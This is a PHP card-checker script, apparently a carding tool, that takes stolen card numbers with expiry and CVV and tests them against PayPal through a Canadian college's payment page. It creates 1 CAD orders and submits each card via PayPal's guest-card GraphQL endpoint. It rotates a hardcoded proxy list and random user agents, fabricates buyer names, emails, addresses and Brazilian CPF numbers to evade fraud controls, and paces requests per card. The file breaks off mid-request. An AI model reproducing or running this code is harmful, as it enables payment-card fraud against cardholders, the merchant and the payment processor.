<?php

$time = time();

// ============================================
// CONFIGURACOES
// ============================================
$DELAY_BETWEEN_CARDS = 20; // Aumentei para 20 segundos
$MAX_RETRIES = 3;

// ============================================

$proxyList = array(
    '15.152.75.215:25795', '68.183.163.35:3128', '43.205.242.234:49',
    '51.92.173.133:10674', '18.163.33.4:24267', '8.211.194.85:3128',
    '15.229.231.89:10001', '16.51.62.173:46099', '16.51.148.102:26135',
    '13.208.166.217:37344', '16.51.148.102:9091', '15.152.75.215:6064',
    '16.18.37.186:6577', '16.51.62.173:3715', '43.205.242.234:20306',
    '54.206.129.120:27258', '56.155.73.215:22871', '54.206.129.120:11714',
    '56.155.73.215:22423', '43.206.240.252:22846', '51.92.173.133:15857',
    '98.130.11.240:20694', '54.253.167.61:15212', '51.92.173.133:29143',
    '165.22.57.158:8080', '165.225.72.38:11707', '165.225.72.38:10306',
    '186.5.94.206:999', '165.225.72.38:10261', '165.225.72.38:11700',
    '212.58.132.5:8888', '89.167.98.117:3128', '8.213.222.247:106',
    '203.95.196.80:8080', '75.111.126.163:80', '47.238.128.246:888',
    '35.182.12.78:55754', '35.182.12.78:16620', '35.182.12.78:5000',
    '35.182.12.78:29446', '8.210.17.35:9090', '82.148.18.242:443',
    '83.97.79.114:8443', '47.121.133.212:8080', '39.102.209.128:8089',
    '106.14.91.83:9080', '39.102.214.208:8081', '146.59.16.105:3128',
    '64.188.77.26:3128', '60.249.94.208:3128', '47.109.110.10:80',
    '18.222.132.180:56258', '192.254.226.75:80', '39.104.23.154:8080',
    '8.220.136.174:1080', '197.221.234.253:80', '197.221.249.199:80'
);

$currentProxy = '';
$currentUserAgent = '';
$rateLimitCount = 0;
$goodProxies = array();
$badProxies = array();

function getBestProxy() {
    global $proxyList, $goodProxies, $badProxies;
    
    if (!empty($goodProxies)) {
        $proxy = $goodProxies[array_rand($goodProxies)];
        return $proxy;
    }
    
    $available = array_diff($proxyList, $badProxies);
    if (empty($available)) {
        $badProxies = array();
        $available = $proxyList;
    }
    
    $proxy = $available[array_rand($available)];
    return $proxy;
}

function markProxyAsGood($proxy) {
    global $goodProxies, $badProxies;
    $badProxies = array_diff($badProxies, array($proxy));
    if (!in_array($proxy, $goodProxies)) {
        $goodProxies[] = $proxy;
    }
}

function markProxyAsBad($proxy) {
    global $badProxies;
    if (!in_array($proxy, $badProxies)) {
        $badProxies[] = $proxy;
    }
}

function setupCurlProxy($ch) {
    global $currentProxy;
    $proxy = getBestProxy();
    $currentProxy = $proxy;
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    return $ch;
}

function gerarCidadeEua() {
    global $cidades_eua;
    $cidadeAleatoria = $cidades_eua[array_rand($cidades_eua)];
    return $cidadeAleatoria;
}

function gerarZipCode() {
    return str_pad(rand(0, 99999), 5, '0', STR_PAD_LEFT);
}

function gerarEndereco() {
    $numeroRua = rand(100, 9999); 
    $ruas = ['Main St', 'Broadway', '5th Ave', 'Elm St', 'Sunset Blvd', 'Maple Ave', 'Oak St', 'King St'];
    $ruaAleatoria = $ruas[array_rand($ruas)];
    $cidade = gerarCidadeEua();
    $zipCode = gerarZipCode();
    $endereco = "$numeroRua $ruaAleatoria, $cidade, $zipCode";
    return $endereco;
}

function gerarNumeroTelefone() {
    $prefixo = "714-4";
    $segundoBloco = rand(100, 999);  
    $terceiroBloco = rand(1000, 9999); 
    $numeroTelefone = $prefixo . $segundoBloco . "-" . $terceiroBloco;
    return $numeroTelefone;
}

function generateUUID() {
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function buscar($string, $inicio, $fim) {
    $inicioPos = strpos($string, $inicio);
    if ($inicioPos === false) return false;
    $inicioPos += strlen($inicio);
    $fimPos = strpos($string, $fim, $inicioPos);
    if ($fimPos === false) return false;
    return substr($string, $inicioPos, $fimPos - $inicioPos);
}

function getstr($separa, $inicia, $fim, $contador) {
    $nada = explode($inicia, $separa);
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
    return implode('', $cpf);
}

function gerarUserAgent() {
    $navegadores = [
        'Chrome' => [
            'versao_min' => 90,
            'versao_max' => 120,
            'plataformas' => ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64'],
        ],
        'Firefox' => [
            'versao_min' => 80,
            'versao_max' => 120,
            'plataformas' => ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64'],
        ],
        'Safari' => [
            'versao_min' => 14,
            'versao_max' => 17,
            'plataformas' => ['Macintosh; Intel Mac OS X 10_15_7'],
        ],
        'Edge' => [
            'versao_min' => 90,
            'versao_max' => 120,
            'plataformas' => ['Windows NT 10.0; Win64; x64'],
        ],
        'Opera' => [
            'versao_min' => 70,
            'versao_max' => 90,
            'plataformas' => ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64'],
        ],
    ];
    $navegador = array_rand($navegadores);
    $dadosNavegador = $navegadores[$navegador];
    $versao = mt_rand($dadosNavegador['versao_min'], $dadosNavegador['versao_max']);
    $plataforma = $dadosNavegador['plataformas'][array_rand($dadosNavegador['plataformas'])];
    
    $versaoInt = $versao;
    $versaoStr = $versao . '.' . mt_rand(0, 9) . '.' . mt_rand(0, 9);
    
    switch ($navegador) {
        case 'Chrome':
            return "Mozilla/5.0 ($plataforma) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$versaoInt}.0.{$versaoInt}.{$versaoInt} Safari/537.36";
        case 'Firefox':
            return "Mozilla/5.0 ($plataforma; rv:{$versaoInt}.0) Gecko/20100101 Firefox/{$versaoInt}.0";
        case 'Safari':
            return "Mozilla/5.0 ($plataforma) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{$versaoInt}.1 Safari/605.1.15";
        case 'Edge':
            return "Mozilla/5.0 ($plataforma) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$versaoInt}.0.0.0 Safari/537.36 Edg/{$versaoInt}.0.0.0";
        case 'Opera':
            return "Mozilla/5.0 ($plataforma) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$versaoInt}.0.0.0 Safari/537.36 OPR/{$versaoInt}.0.0.0";
        default:
            return "Mozilla/5.0 ($plataforma) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$versaoInt}.0.0.0 Safari/537.36";
    }
}

function nome($nome1){
    $nome = $nome1[array_rand($nome1)];
    return $nome;
}

function sobrenome($sobrenome1) {
    $sobrenome = $sobrenome1[array_rand($sobrenome1)];
    return $sobrenome;
}

function email($nome1, $sobrenome1) {
    $nome = $nome1[array_rand($nome1)]; 
    $sobrenome = $sobrenome1[array_rand($sobrenome1)];
    $numero = rand(0, 30);
    return $nome . $sobrenome . $numero . '@gmail.com';
}

function gerarEmail($nome1, $sobrenome1) {
    $nomeEscolhido = $nome1[array_rand($nome1)];
    $sobrenomeEscolhido = $sobrenome1[array_rand($sobrenome1)];
    $numero = rand(0, 30);
    return strtolower($nomeEscolhido . $sobrenomeEscolhido . $numero . '@gmail.com');
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.4devs.com.br',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    'content-type: application/x-www-form-urlencoded',
    'sec-ch-ua-mobile: ?0',
    'accept: */*',
    'origin: https://www.4devs.com.br',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.4devs.com.br/gerador_de_pessoas',
    'accept-language: pt-BR,pt;q=0.9',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');

$response = curl_exec($ch);

$cidades_eua = [
    'New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 
    'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose',
    'Austin', 'Jacksonville', 'Fort Worth', 'Columbus', 'Indianapolis', 
    'Charlotte', 'Seattle', 'Denver', 'Washington', 'Boston',
    'El Paso', 'Detroit', 'Nashville', 'Portland', 'Memphis',
    'Oklahoma City', 'Las Vegas', 'Louisville', 'Baltimore', 'Milwaukee',
    'Albuquerque', 'Tucson', 'Fresno', 'Sacramento', 'Kansas City',
    'Long Beach', 'Mesa', 'Atlanta', 'Colorado Springs', 'Raleigh',
    'Omaha', 'Miami', 'Oakland', 'Minneapolis', 'Tulsa',
    'Cleveland', 'Wichita', 'Arlington', 'New Orleans', 'Bakersfield',
    'Honolulu', 'Anaheim', 'Santa Ana', 'Corpus Christi', 'Riverside'
];

$nome1 = ['Carlos', 'Joao', 'Maria', 'Paulo', 'Ana', 'Lucas', 'Bruna', 'Rafael', 'Camila', 'Roberto',
         'Larissa', 'Felipe', 'Isabela', 'Gustavo', 'Juliana', 'Marcos', 'Tatiane', 'Ricardo', 'Vanessa', 'Eduardo',
         'Carolina', 'Andre', 'Beatriz', 'Daniel', 'Fernanda', 'Thiago', 'Priscila', 'Alexandre', 'Aline', 'Bruno',
         'Leticia', 'Renato', 'Jessica', 'Diego', 'Natalia', 'Henrique', 'Amanda', 'Leonardo', 'Patricia', 'Carlos',
         'Fabiana', 'Igor', 'Sabrina', 'Vitor', 'Daniela', 'Mateus', 'Tatiana', 'Joao', 'Michele', 'Pedro', 'Elaine',
         'Paula', 'Tiago', 'Marcelo', 'Vinicius', 'Gabriel', 'Sofia', 'Larissa', 'Jorge', 'Felipe', 'Renata', 'Simone', 
         'Ricardo', 'Eduardo', 'Beatriz', 'Alexia', 'Gabriela', 'Samuel', 'Thiago', 'Bruna', 'Fernando', 'Cristiano'];

$sobrenome1 = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Lima', 'Barbosa',
              'Ribeiro', 'Moura', 'Dias', 'Teixeira', 'Fernandes', 'Carvalho', 'Gomes', 'Martins', 'Araujo', 'Pinto',
              'Mendes', 'Freitas', 'Correa', 'Vieira', 'Castro', 'Ramos', 'Monteiro', 'Cardoso', 'Batista', 'Morais',
              'Pires', 'Cunha', 'Barros', 'Macedo', 'Santiago', 'Pires', 'Rezende', 'Silveira', 'Mattos', 'Neves',
              'Sousa', 'Figueiredo', 'Lopes', 'Tavares', 'Pires', 'Saraiva', 'Faria', 'Moraes', 'Coelho', 'Machado',
              'Nunes', 'Lima', 'Campos', 'Melo', 'Paiva', 'Moreno', 'Guimaraes', 'Costa', 'Brito', 'Pimentel', 
              'Viana', 'Bastos', 'Pereira', 'Cavalcante', 'Barreto', 'Magalhaes', 'Araujo', 'Dias', 'Farias', 'Mota'];

$nome = nome($nome1);
$sobrenome = sobrenome($sobrenome1);
$email = gerarEmail($nome1, $sobrenome1);
$email1 = urlencode($email);
$user = gerarUserAgent();
$user1 = urlencode($user);
$uuid = generateUUID();
$cpf = gerarCPF();
$city = gerarCidadeEua();
$zipCode = gerarZipCode();
$adress = gerarEndereco();
$phone = gerarNumeroTelefone();

$nome4 = buscar($response, 'nome":"', '"');
$idade4 = buscar($response, 'idade":', ',');
$cpf4 = buscar($response, ',"cpf":"', '"');
$nasc4 = buscar($response, 'data_nasc":"', '"');
$cep4 = buscar($response, 'cep":"', '"');
$endereco4 = buscar($response, 'endereco":"', '"');
$nomero4 = buscar($response, 'numero":', ',');
$bairro4 = buscar($response, 'bairro":"', '"');
$cidade4 = buscar($response, 'cidade":"', '"');
$estado4 = buscar($response, '"estado":"', '"');
$celular4 = buscar($response, 'celular":"', '"');

date_default_timezone_set('America/Sao_Paulo');
$dataAtual = date('Y-m-d');
$horaAtual = date('H:i:s');
$horaAtual . '<br>';
$dataAtual . '<br>';
$horaAtual2 = urlencode($horaAtual);

$microtime = microtime(true);
$timestampMs = (int) round($microtime * 1000);
$horaUrl = urlencode($horaAtual);

if (file_exists('limo.txt')) {
    unlink('limo.txt');
}

$cookieFile = getcwd() . '/limo.txt';

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);

$ms = ltrim($mes, '0');
$an = substr($ano, 2); 

$band = substr($cc, 0, 1);

if ($band == '3') {
    $bandeira = 'AMEX';
} elseif ($band == '5') {
    $bandeira = 'MASTER_CARD';
} elseif ($band == '4') {
    $bandeira = 'VISA';
} elseif ($band == '6') {
    $bandeira = 'DISCOVER';
} elseif ($band == '2') {
    $bandeira = 'MASTER_CARD';
} else {
    $bandeira = 'UNKNOWN';
}

// ============================================
// REQUISICOES COM PROXY E USER-AGENT
// ============================================

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://keystonecollege.ca/pay-now/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
$user = gerarUserAgent();
curl_setopt($ch, CURLOPT_USERAGENT, $user);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: keystonecollege.ca',
    'sec-ch-ua: "Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$user.'',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'sec-gpc: 1',
    'accept-language: pt-BR,pt;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://keystonecollege.ca/',
    'priority: u=0, i',
    'Accept-Encoding: gzip',
]);
setupCurlProxy($ch);

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/buttons?style.label=pay&style.layout=vertical&style.color=blue&style.shape=rect&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false&style.isButtonColorABTestMerchant=false&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_c3bc9d9830_mtg6ndk6mji&buttonSize=huge&customerId=&clientID=AYQQ336cADQUr8Kap0ChKHV9feGBOZCsxhjtE2dWA17hcNh9tR9jaMokSTlVAAoHYZUGmhIQLoutIIxi&clientMetadataID=uid_aead203683_mtg6ndg6mzi&commit=true&components.0=buttons&currency=CAD&debug=false&disableSetCookie=true&eagerOrderCreation=false&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.spbEagerOrderCreation=false&experiment.venmoWebEnabled=false&experiment.isWebViewEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.isPaypalRebrandABTestEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_darkBlue&experiment.isEdgeCacheStaleEnabled=false&experiment.isCsnwErrorTestingEnabled=false&experiment.venmoEnableWebOnNonNativeBrowser=false&experiment.paypalCreditButtonCreateVaultSetupTokenExists=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImNiX25hdGlvbmFsZSI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=BR&locale.lang=pt&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_aead203683_mtg6ndg6mzi&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVlRUTMzNmNBRFFVcjhLYXAwQ2hLSFY5ZmVHQk9aQ3N4aGp0RTJkV0ExN2hjTmg5dFI5amFNb2tTVGxWQUFvSFlaVUdtaElRTG91dElJeGkmY3VycmVuY3k9Q0FEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF9tdmh4dGh4aHhlYW13bHJzYXVna2dqeGRmcmpqenMifX0&sdkVersion=5.0.520&storageID=uid_98fe0ca035_mtg6ndg6mzi&buttonColor.shouldApplyRebrandedStyles=false&buttonColor.color=blue&buttonColor.isButtonColorABTestMerchant=false&supportedNativeBrowser=false&supportedNativeVenmoBrowser=false&supportsPopups=true&supportsVenmoPopups=true&sdkSource=button-factory&vault=false&userAgent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F142.0.0.0%20Safari%2F537.36');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
$user = gerarUserAgent();
curl_setopt($ch, CURLOPT_USERAGENT, $user);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.paypal.com',
    'sec-ch-ua: "Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$user.'',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'sec-gpc: 1',
    'accept-language: pt-BR,pt;q=0.5',
    'sec-fetch-site: cross-site',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: iframe',
    'sec-fetch-storage-access: none',
    'referer: https://keystonecollege.ca/',
    'priority: u=0, i',
    'Accept-Encoding: gzip',
]);
setupCurlProxy($ch);

$response = curl_exec($ch);

$bearer = buscar($response, '"facilitatorAccessToken":"', '"');
$buttonSession = buscar($response, '"buttonSessionID":"', '"');
$Sdk_Meta = buscar($response, 'sdkMeta":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/v2/checkout/orders');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
$user = gerarUserAgent();
curl_setopt($ch, CURLOPT_USERAGENT, $user);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.paypal.com',
    'authorization: Bearer '.$bearer.'',
    'user-agent: '.$user.'',
    'accept: application/json',
    'content-type: application/json',
    'accept-language: pt-BR,pt;q=0.5',
    'origin: https://www.paypal.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'sec-fetch-storage-access: none',
    'referer: https://www.paypal.com/',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase_units":[{"amount":{"value":"1","currency_code":"CAD"},"description":"a"}],"intent":"CAPTURE","application_context":{}}');
setupCurlProxy($ch);

$response = curl_exec($ch);
$id = buscar($response, '"id":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/card-fields?token='.$id.'&sessionID=uid_aead203683_mtg6ndg6mzi&buttonSessionID='.$buttonSession.'&locale.x=pt_BR&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=BR&sdkMeta='.$Sdk_Meta.'&disable-card=');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
$user = gerarUserAgent();
curl_setopt($ch, CURLOPT_USERAGENT, $user);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.paypal.com',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$user.'',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: pt-BR,pt;q=0.5',
    'sec-fetch-site: same-origin',
    'referer: https://www.paypal.com/',
    'priority: u=0, i',
    'Accept-Encoding: gzip',
]);
setupCurlProxy($ch);

$response = curl_exec($ch);

// Busca o integrity token
$integrityToken = buscar($response, '"integrityToken":"', '"');

// Se não achou, tenta outra forma
if (!$integrityToken) {
    preg_match('/integrityToken":"([^"]+)"/', $response, $matches);
    if (isset($matches[1])) {
        $integrityToken = $matches[1];
    }
}

$data = array(
  "query" => "
        mutation payWithCard(
            \$token: String!
            \$card: CardInput
            \$paymentToken: String
            \$phoneNumber: String
            \$firstName: String
            \$lastName: String
            \$shippingAddress: AddressInput
           \$billingAddress: AddressInput
            \$email: String
            \$currencyConversionType: CheckoutCurrencyConversionType
            \$installmentTerm: Int
            \$identityDocument: IdentityDocumentInput
            \$feeReferenceId: String
            \$integrityToken: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: \$token
                card: \$card
                paymentToken: \$paymentToken
                phoneNumber: \$phoneNumber
                firstName: \$firstName
                lastName: \$lastName
                email: \$email
                shippingAddress: \$shippingAddress
                billingAddress: \$billingAddress
                currencyConversionType: \$currencyConversionType
                installmentTerm: \$installmentTerm
                identityDocument: \$identityDocument
                feeReferenceId: \$feeReferenceId
                integrityToken: \$integrityToken
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        ",
  "variables" => array(
    "token" => $id,
    "card" => array(
      "cardNumber" => $cc,
      "type" => $bandeira,
      "expirationDate" => $mes.'/'.$ano,
      "postalCode" => "10018",
      "securityCode" => $cvv,
      "productClass" => "CREDIT"
    ),
    "integrityToken" => $integrityToken,
    "phoneNumber" => "5109585574",
    "firstName" => $nome,
    "lastName" => $sobrenome,
    "billingAddress" => array(
      "givenName" => $nome,
      "familyName" => $sobrenome,
      "country" => "US",
      "postalCode" => "10018",
      "line1" => "strret 14",
      "line2" => "",
      "city" => "new york",
      "state" => "NY"
    ),
    "shippingAddress" => array(
      "givenName" => $nome,
      "familyName" => $sobrenome,
      "country" => "US",
      "postalCode" => "10018",
      "line1" => "strret 14",
      "line2" => "",
      "city" => "new york",
      "state" => "NY"
    ),
    "email" => $email,
    "currencyConversionType" => "VENDOR"
  ),
  "operationName" => null
);

$data1 = json_encode($data);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
$user = gerarUserAgent();
curl_setopt($ch, CURLOPT_USERAGENT, $user);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.paypal.com',
    'paypal-client-context: '.$id.'',
    'x-app-name: standardcardfields',
    'sec-ch-ua: "Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'paypal-client-metadata-id: '.$id.'',
    'user-agent: '.$user.'',
    'x-country: BR',
    'content-type: application/json',
    'accept: */*',
    'sec-gpc: 1',
    'accept-language: pt-BR,pt;q=0.5',
    'origin: https://www.paypal.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'sec-fetch-storage-access: none',
    'priority: u=1, i',
